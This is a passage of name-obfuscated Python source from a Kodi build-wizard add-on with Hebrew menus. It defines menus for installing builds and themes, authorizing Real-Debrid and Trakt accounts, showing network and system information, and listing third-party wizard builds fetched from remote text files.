		if O0O000O00OO00O00O >BUILDVERSION :O00OOO0O0OOOO0O0O ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O00OOO0O0OOOO0O0O ,O0O000O00OO00O00O )#line:2408
		addDir (O00OOO0O0OOOO0O0O ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2410
		try :#line:2412
		     OO0OOOOOOOOO0O00O =wiz .themeCount (BUILDNAME )#line:2413
		except :#line:2414
		   OO0OOOOOOOOO0O00O =False #line:2415
		if not OO0OOOOOOOOO0O00O ==False :#line:2416
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2417
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2418
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2421
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2422
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2423
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2427
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2429
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2431
def morsetup ():#line:2433
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2434
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2435
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2436
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2437
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2438
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2442
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2443
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2446
	addFile ('התקנת לקוח טלוויזיה חיה','simpleiptv',icon =ICONMAINT ,themeit =THEME1 )#line:2447
	addFile ('הגדרת ערוצים עידן פלוס בטלוויזיה חיה','simpleidanplus',icon =ICONMAINT ,themeit =THEME1 )#line:2448
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2449
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2459
	setView ('files','viewType')#line:2460
def morsetup2 ():#line:2461
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2462
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2463
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2464
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2465
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2466
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2467
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2468
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2469
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2470
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2471
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2472
def fastupdate ():#line:2473
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2474
def forcefastupdate ():#line:2476
			OOOO0OOO000O0O0O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2477
			wiz .ForceFastUpDate (ADDONTITLE ,OOOO0OOO000O0O0O0 )#line:2478
def rdsetup ():#line:2482
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2483
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2484
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2486
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2487
def traktsetup ():#line:2490
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2491
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2492
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2493
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2494
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2495
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2496
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2497
	setView ('files','viewType')#line:2498
def setautorealdebrid ():#line:2499
    from resources .libs import real_debrid #line:2500
    O0O0O0O0O00OO0O0O =real_debrid .RealDebridFirst ()#line:2501
    O0O0O0O0O00OO0O0O .auth ()#line:2502
def setrealdebrid ():#line:2504
    OO000O0O00OOO0OOO =(ADDON .getSetting ("auto_rd"))#line:2505
    if OO000O0O00OOO0OOO =='false':#line:2506
       ADDON .openSettings ()#line:2507
    else :#line:2508
        from resources .libs import real_debrid #line:2509
        O000OOO0O0000OOOO =real_debrid .RealDebrid ()#line:2510
        O000OOO0O0000OOOO .auth ()#line:2511
        rdon ()#line:2514
def resolveurlsetup ():#line:2516
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2517
def urlresolversetup ():#line:2518
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2519
def placentasetup ():#line:2521
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2522
def reptiliasetup ():#line:2523
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2524
def flixnetsetup ():#line:2525
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2526
def yodasetup ():#line:2527
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2528
def numberssetup ():#line:2529
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2530
def uranussetup ():#line:2531
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2532
def genesissetup ():#line:2533
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2534
def net_tools (view =None ):#line:2536
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2537
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2538
	setView ('files','viewType')#line:2540
def speedMenu ():#line:2541
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2542
def viewIP ():#line:2543
	OO0OO00000OO0000O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2557
	OO0OOO00OOO0O0OO0 =[];O00OOOO0O00OO0OOO =0 #line:2558
	for OO0OO00OO0OO0OO00 in OO0OO00000OO0000O :#line:2559
		O0O00O0O00OOO00OO =wiz .getInfo (OO0OO00OO0OO0OO00 )#line:2560
		OO00OOOO0OOO00OO0 =0 #line:2561
		while O0O00O0O00OOO00OO =="Busy"and OO00OOOO0OOO00OO0 <10 :#line:2562
			O0O00O0O00OOO00OO =wiz .getInfo (OO0OO00OO0OO0OO00 );OO00OOOO0OOO00OO0 +=1 ;wiz .log ("%s sleep %s"%(OO0OO00OO0OO0OO00 ,str (OO00OOOO0OOO00OO0 )));xbmc .sleep (1000 )#line:2563
		OO0OOO00OOO0O0OO0 .append (O0O00O0O00OOO00OO )#line:2564
		O00OOOO0O00OO0OOO +=1 #line:2565
	O000O00O00O000OO0 ,O00O0O0O0O0OO00OO ,OOOOO00OO0OO000OO =getIP ()#line:2566
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO00OOO0O0OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2567
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00O00O000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2568
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0O0O0OO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2569
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00OO0OO000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2570
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO00OOO0O0OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2571
	setView ('files','viewType')#line:2572
def buildMenu ():#line:2574
	if USERNAME =='':#line:2575
		ADDON .openSettings ()#line:2576
		sys .exit ()#line:2577
	if PASSWORD =='':#line:2578
		ADDON .openSettings ()#line:2579
	OOO0O0O000O000O00 =u_list (SPEEDFILE )#line:2580
	(OOO0O0O000O000O00 )#line:2581
	O0OOO000OOO000000 =(wiz .workingURL (OOO0O0O000O000O00 ))#line:2582
	(O0OOO000OOO000000 )#line:2583
	O0OOO000OOO000000 =wiz .workingURL (SPEEDFILE )#line:2584
	if not O0OOO000OOO000000 ==True :#line:2585
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2586
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2587
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2588
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2589
		addFile ('%s'%O0OOO000OOO000000 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2590
	else :#line:2591
		O00000OOO0OOO0OO0 ,OO0000OOOO000OOOO ,O0OOOO0O0000OO0O0 ,OO00OOO0OOO00O00O ,O0O0O000O0O00O0OO ,O00OOO000000OOOOO ,O0OO000OOOOOOOO0O =wiz .buildCount ()#line:2592
		OOO0O0OO0O0O0000O =False ;OOOO0000OOO0O0O0O =[]#line:2593
		if THIRDPARTY =='true':#line:2594
			if not THIRD1NAME ==''and not THIRD1URL =='':OOO0O0OO0O0O0000O =True ;OOOO0000OOO0O0O0O .append ('1')#line:2595
			if not THIRD2NAME ==''and not THIRD2URL =='':OOO0O0OO0O0O0000O =True ;OOOO0000OOO0O0O0O .append ('2')#line:2596
			if not THIRD3NAME ==''and not THIRD3URL =='':OOO0O0OO0O0O0000O =True ;OOOO0000OOO0O0O0O .append ('3')#line:2597
		OO00O00OO00OOO000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2598
		OO0O0000OOOOO0OOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O00OO00OOO000 )#line:2599
		if O00000OOO0OOO0OO0 ==1 and OOO0O0OO0O0O0000O ==False :#line:2600
			for OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ,OOO0OOO0OOOOOO0OO ,OOOO00O000OO0O000 ,OO00OO0OOO0O0OOOO ,O0OOO0O00000OO0O0 ,OO0O0OO0O0O0O0000 ,O0O0OOO00OO0OO0O0 ,O0OOO00O000OO00OO ,OO0OO00OO0000O00O in OO0O0000OOOOO0OOO :#line:2601
				if not SHOWADULT =='true'and O0OOO00O000OO00OO .lower ()=='yes':continue #line:2602
				if not DEVELOPER =='true'and wiz .strTest (OOOO0O00OO0O0O00O ):continue #line:2603
				viewBuild (OO0O0000OOOOO0OOO [0 ][0 ])#line:2604
				return #line:2605
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2608
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2609
		if OOO0O0OO0O0O0000O ==True :#line:2610
			for OO000OOOO00000OO0 in OOOO0000OOO0O0O0O :#line:2611
				OOOO0O00OO0O0O00O =eval ('THIRD%sNAME'%OO000OOOO00000OO0 )#line:2612
		if len (OO0O0000OOOOO0OOO )>=1 :#line:2614
			if SEPERATE =='true':#line:2615
				for OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ,OOO0OOO0OOOOOO0OO ,OOOO00O000OO0O000 ,OO00OO0OOO0O0OOOO ,O0OOO0O00000OO0O0 ,OO0O0OO0O0O0O0000 ,O0O0OOO00OO0OO0O0 ,O0OOO00O000OO00OO ,OO0OO00OO0000O00O in OO0O0000OOOOO0OOO :#line:2616
					if not SHOWADULT =='true'and O0OOO00O000OO00OO .lower ()=='yes':continue #line:2617
					if not DEVELOPER =='true'and wiz .strTest (OOOO0O00OO0O0O00O ):continue #line:2618
					OOOOO0000OO0O0OO0 =createMenu ('install','',OOOO0O00OO0O0O00O )#line:2619
					addDir ('[%s] %s (v%s)'%(float (OO00OO0OOO0O0OOOO ),OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ),'viewbuild',OOOO0O00OO0O0O00O ,description =OO0OO00OO0000O00O ,fanart =O0O0OOO00OO0OO0O0 ,icon =OO0O0OO0O0O0O0000 ,menu =OOOOO0000OO0O0OO0 ,themeit =THEME2 )#line:2620
			else :#line:2621
				if OO00OOO0OOO00O00O >0 :#line:2622
					OOOO00OOOOO0000O0 ='+'if SHOW17 =='false'else '-'#line:2623
					if SHOW17 =='true':#line:2625
						for OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ,OOO0OOO0OOOOOO0OO ,OOOO00O000OO0O000 ,OO00OO0OOO0O0OOOO ,O0OOO0O00000OO0O0 ,OO0O0OO0O0O0O0000 ,O0O0OOO00OO0OO0O0 ,O0OOO00O000OO00OO ,OO0OO00OO0000O00O in OO0O0000OOOOO0OOO :#line:2627
							if not SHOWADULT =='true'and O0OOO00O000OO00OO .lower ()=='yes':continue #line:2628
							if not DEVELOPER =='true'and wiz .strTest (OOOO0O00OO0O0O00O ):continue #line:2629
							OOO00OO00O00O0O00 =int (float (OO00OO0OOO0O0OOOO ))#line:2630
							if OOO00OO00O00O0O00 ==17 :#line:2631
								OOOOO0000OO0O0OO0 =createMenu ('install','',OOOO0O00OO0O0O00O )#line:2632
								addDir ('[%s] %s (v%s)'%(float (OO00OO0OOO0O0OOOO ),OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ),'viewbuild',OOOO0O00OO0O0O00O ,description =OO0OO00OO0000O00O ,fanart =O0O0OOO00OO0OO0O0 ,icon =OO0O0OO0O0O0O0000 ,menu =OOOOO0000OO0O0OO0 ,themeit =THEME2 )#line:2633
				if O0O0O000O0O00O0OO >0 :#line:2634
					OOOO00OOOOO0000O0 ='+'if SHOW18 =='false'else '-'#line:2635
					if SHOW18 =='true':#line:2637
						for OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ,OOO0OOO0OOOOOO0OO ,OOOO00O000OO0O000 ,OO00OO0OOO0O0OOOO ,O0OOO0O00000OO0O0 ,OO0O0OO0O0O0O0000 ,O0O0OOO00OO0OO0O0 ,O0OOO00O000OO00OO ,OO0OO00OO0000O00O in OO0O0000OOOOO0OOO :#line:2639
							if not SHOWADULT =='true'and O0OOO00O000OO00OO .lower ()=='yes':continue #line:2640
							if not DEVELOPER =='true'and wiz .strTest (OOOO0O00OO0O0O00O ):continue #line:2641
							OOO00OO00O00O0O00 =int (float (OO00OO0OOO0O0OOOO ))#line:2642
							if OOO00OO00O00O0O00 ==18 :#line:2643
								OOOOO0000OO0O0OO0 =createMenu ('install','',OOOO0O00OO0O0O00O )#line:2644
								addDir ('[%s] %s (v%s)'%(float (OO00OO0OOO0O0OOOO ),OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ),'viewbuild',OOOO0O00OO0O0O00O ,description =OO0OO00OO0000O00O ,fanart =O0O0OOO00OO0OO0O0 ,icon =OO0O0OO0O0O0O0000 ,menu =OOOOO0000OO0O0OO0 ,themeit =THEME2 )#line:2645
				if O0OOOO0O0000OO0O0 >0 :#line:2646
					OOOO00OOOOO0000O0 ='+'if SHOW16 =='false'else '-'#line:2647
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOO00OOOOO0000O0 ,O0OOOO0O0000OO0O0 ),'togglesetting','show16',themeit =THEME3 )#line:2648
					if SHOW16 =='true':#line:2649
						for OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ,OOO0OOO0OOOOOO0OO ,OOOO00O000OO0O000 ,OO00OO0OOO0O0OOOO ,O0OOO0O00000OO0O0 ,OO0O0OO0O0O0O0000 ,O0O0OOO00OO0OO0O0 ,O0OOO00O000OO00OO ,OO0OO00OO0000O00O in OO0O0000OOOOO0OOO :#line:2650
							if not SHOWADULT =='true'and O0OOO00O000OO00OO .lower ()=='yes':continue #line:2651
							if not DEVELOPER =='true'and wiz .strTest (OOOO0O00OO0O0O00O ):continue #line:2652
							OOO00OO00O00O0O00 =int (float (OO00OO0OOO0O0OOOO ))#line:2653
							if OOO00OO00O00O0O00 ==16 :#line:2654
								OOOOO0000OO0O0OO0 =createMenu ('install','',OOOO0O00OO0O0O00O )#line:2655
								addDir ('[%s] %s (v%s)'%(float (OO00OO0OOO0O0OOOO ),OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ),'viewbuild',OOOO0O00OO0O0O00O ,description =OO0OO00OO0000O00O ,fanart =O0O0OOO00OO0OO0O0 ,icon =OO0O0OO0O0O0O0000 ,menu =OOOOO0000OO0O0OO0 ,themeit =THEME2 )#line:2656
				if OO0000OOOO000OOOO >0 :#line:2657
					OOOO00OOOOO0000O0 ='+'if SHOW15 =='false'else '-'#line:2658
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOO00OOOOO0000O0 ,OO0000OOOO000OOOO ),'togglesetting','show15',themeit =THEME3 )#line:2659
					if SHOW15 =='true':#line:2660
						for OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ,OOO0OOO0OOOOOO0OO ,OOOO00O000OO0O000 ,OO00OO0OOO0O0OOOO ,O0OOO0O00000OO0O0 ,OO0O0OO0O0O0O0000 ,O0O0OOO00OO0OO0O0 ,O0OOO00O000OO00OO ,OO0OO00OO0000O00O in OO0O0000OOOOO0OOO :#line:2661
							if not SHOWADULT =='true'and O0OOO00O000OO00OO .lower ()=='yes':continue #line:2662
							if not DEVELOPER =='true'and wiz .strTest (OOOO0O00OO0O0O00O ):continue #line:2663
							OOO00OO00O00O0O00 =int (float (OO00OO0OOO0O0OOOO ))#line:2664
							if OOO00OO00O00O0O00 <=15 :#line:2665
								OOOOO0000OO0O0OO0 =createMenu ('install','',OOOO0O00OO0O0O00O )#line:2666
								addDir ('[%s] %s (v%s)'%(float (OO00OO0OOO0O0OOOO ),OOOO0O00OO0O0O00O ,OOOOOO0O00OO0O0OO ),'viewbuild',OOOO0O00OO0O0O00O ,description =OO0OO00OO0000O00O ,fanart =O0O0OOO00OO0OO0O0 ,icon =OO0O0OO0O0O0O0000 ,menu =OOOOO0000OO0O0OO0 ,themeit =THEME2 )#line:2667
		elif O0OO000OOOOOOOO0O >0 :#line:2668
			if O00OOO000000OOOOO >0 :#line:2669
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2670
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2671
			else :#line:2672
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2673
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2674
	setView ('files','viewType')#line:2675
def viewBuild (O0O00O0OO0OOO0O00 ):#line:2677
	O0O00O00OO00OOO0O =wiz .workingURL (SPEEDFILE )#line:2678
	if not O0O00O00OO00OOO0O ==True :#line:2679
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2680
		addFile ('%s'%O0O00O00OO00OOO0O ,'',themeit =THEME3 )#line:2681
		return #line:2682
	if wiz .checkBuild (O0O00O0OO0OOO0O00 ,'version')==False :#line:2683
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2684
		addFile ('%s was not found in the builds list.'%O0O00O0OO0OOO0O00 ,'',themeit =THEME3 )#line:2685
		return #line:2686
	OOOO000OOO00OO00O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2687
	OO0O000O0000OOOO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O00O0OO0OOO0O00 ).findall (OOOO000OOO00OO00O )#line:2688
	for OOO00OOO0OO0O0OOO ,O0OO00OOOOO0OO000 ,OO00OO0OOO0OO000O ,OO0O0OOO0OO00O0OO ,OO0OOO00OO0O0OOOO ,O0OO00000OOOO0O0O ,O0O00OOOO0OOO00O0 ,OOO000O0O0OOOO000 ,O00O0O0O0OOO0O00O ,O0000OO00OO0OOO0O in OO0O000O0000OOOO0 :#line:2689
		O0OO00000OOOO0O0O =O0OO00000OOOO0O0O if wiz .workingURL (O0OO00000OOOO0O0O )else ICON #line:2690
		O0O00OOOO0OOO00O0 =O0O00OOOO0OOO00O0 if wiz .workingURL (O0O00OOOO0OOO00O0 )else FANART #line:2691
		O0OOOOOOOO0OO0000 ='%s (v%s)'%(O0O00O0OO0OOO0O00 ,OOO00OOO0OO0O0OOO )#line:2692
		if BUILDNAME ==O0O00O0OO0OOO0O00 and OOO00OOO0OO0O0OOO >BUILDVERSION :#line:2693
			O0OOOOOOOO0OO0000 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0OOOOOOOO0OO0000 ,BUILDVERSION )#line:2694
		OOO000OOOOO000000 =int (float (KODIV ));O00000O0OO00OO000 =int (float (OO0O0OOO0OO00O0OO ))#line:2703
		if not OOO000OOOOO000000 ==O00000O0OO00OO000 :#line:2704
			if OOO000OOOOO000000 ==16 and O00000O0OO00OO000 <=15 :O0OO0O0OOOOOO0OOO =False #line:2705
			else :O0OO0O0OOOOOO0OOO =True #line:2706
		else :O0OO0O0OOOOOO0OOO =False #line:2707
		addFile ('התקנה','install',O0O00O0OO0OOO0O00 ,'fresh',description =O0000OO00OO0OOO0O ,fanart =O0O00OOOO0OOO00O0 ,icon =O0OO00000OOOO0O0O ,themeit =THEME1 )#line:2711
		if not OO0OOO00OO0O0OOOO =='http://':#line:2714
			if wiz .workingURL (OO0OOO00OO0O0OOOO )==True :#line:2715
				addFile (wiz .sep ('THEMES'),'',fanart =O0O00OOOO0OOO00O0 ,icon =O0OO00000OOOO0O0O ,themeit =THEME3 )#line:2716
				OOOO000OOO00OO00O =wiz .openURL (OO0OOO00OO0O0OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2717
				OO0O000O0000OOOO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO000OOO00OO00O )#line:2718
				for O0OOOO000O00OO0OO ,OO00OOOOOO00OOOOO ,O0OO0OOO00OOOO000 ,OOOOO00OO000OO0OO ,OO0O00O0O0OO0O000 ,O0000OO00OO0OOO0O in OO0O000O0000OOOO0 :#line:2719
					if not SHOWADULT =='true'and OO0O00O0O0OO0O000 .lower ()=='yes':continue #line:2720
					O0OO0OOO00OOOO000 =O0OO0OOO00OOOO000 if O0OO0OOO00OOOO000 =='http://'else O0OO00000OOOO0O0O #line:2721
					OOOOO00OO000OO0OO =OOOOO00OO000OO0OO if OOOOO00OO000OO0OO =='http://'else O0O00OOOO0OOO00O0 #line:2722
					addFile (O0OOOO000O00OO0OO if not O0OOOO000O00OO0OO ==BUILDTHEME else "[B]%s (Installed)[/B]"%O0OOOO000O00OO0OO ,'theme',O0O00O0OO0OOO0O00 ,O0OOOO000O00OO0OO ,description =O0000OO00OO0OOO0O ,fanart =OOOOO00OO000OO0OO ,icon =O0OO0OOO00OOOO000 ,themeit =THEME3 )#line:2723
	setView ('files','viewType')#line:2724
def viewThirdList (OO000O0O00O0O0OO0 ):#line:2726
	O000O000OOOO000O0 =eval ('THIRD%sNAME'%OO000O0O00O0O0OO0 )#line:2727
	O0000O00O0OO0O0O0 =eval ('THIRD%sURL'%OO000O0O00O0O0OO0 )#line:2728
	O00OOO0O0OOOOO0O0 =wiz .workingURL (O0000O00O0OO0O0O0 )#line:2729
	if not O00OOO0O0OOOOO0O0 ==True :#line:2730
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2731
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2732
	else :#line:2733
		O0OOO0O00O0O0OO0O ,O0OO0O00O000O00OO =wiz .thirdParty (O0000O00O0OO0O0O0 )#line:2734
		addFile ("[B]%s[/B]"%O000O000OOOO000O0 ,'',themeit =THEME3 )#line:2735
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2736
		if O0OOO0O00O0O0OO0O :#line:2737
			for O000O000OOOO000O0 ,OO0000O0OO0O00000 ,O0000O00O0OO0O0O0 ,OOO00OOOOO0OO0OO0 ,OOOO0O0OOOO0O00O0 ,OOOOO0000O00OOO00 ,OOO0O00OOO00OOOO0 ,O0OOOO00OO00OO00O in O0OO0O00O000O00OO :#line:2738
				if not SHOWADULT =='true'and OOO0O00OOO00OOOO0 .lower ()=='yes':continue #line:2739
				addFile ("[%s] %s v%s"%(OOO00OOOOO0OO0OO0 ,O000O000OOOO000O0 ,OO0000O0OO0O00000 ),'installthird',O000O000OOOO000O0 ,O0000O00O0OO0O0O0 ,icon =OOOO0O0OOOO0O00O0 ,fanart =OOOOO0000O00OOO00 ,description =O0OOOO00OO00OO00O ,themeit =THEME2 )#line:2740
		else :#line:2741
			for O000O000OOOO000O0 ,O0000O00O0OO0O0O0 ,OOOO0O0OOOO0O00O0 ,OOOOO0000O00OOO00 ,O0OOOO00OO00OO00O in O0OO0O00O000O00OO :#line:2742
				addFile (O000O000OOOO000O0 ,'installthird',O000O000OOOO000O0 ,O0000O00O0OO0O0O0 ,icon =OOOO0O0OOOO0O00O0 ,fanart =OOOOO0000O00OOO00 ,description =O0OOOO00OO00OO00O ,themeit =THEME2 )#line:2743
def editThirdParty (OO0OOOOO0O00O000O ):#line:2745
	O0O0O0OO0O00O0OO0 =eval ('THIRD%sNAME'%OO0OOOOO0O00O000O )#line:2746
	O0O00O0O0OOO0OOOO =eval ('THIRD%sURL'%OO0OOOOO0O00O000O )#line:2747
	OO000OOOOO00OO0OO =wiz .getKeyboard (O0O0O0OO0O00O0OO0 ,'Enter the Name of the Wizard')#line:2748
	O00O000OOO000O0O0 =wiz .getKeyboard (O0O00O0O0OOO0OOOO ,'Enter the URL of the Wizard Text')#line:2749
	wiz .setS ('wizard%sname'%OO0OOOOO0O00O000O ,OO000OOOOO00OO0OO )#line:2751
	wiz .setS ('wizard%surl'%OO0OOOOO0O00O000O ,O00O000OOO000O0O0 )#line:2752
def apkScraper (name =""):#line:2754
	if name =='kodi':#line:2755
		O0O00OOOOO0OO0OO0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2756
		O0O0O00O0O00O000O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2757
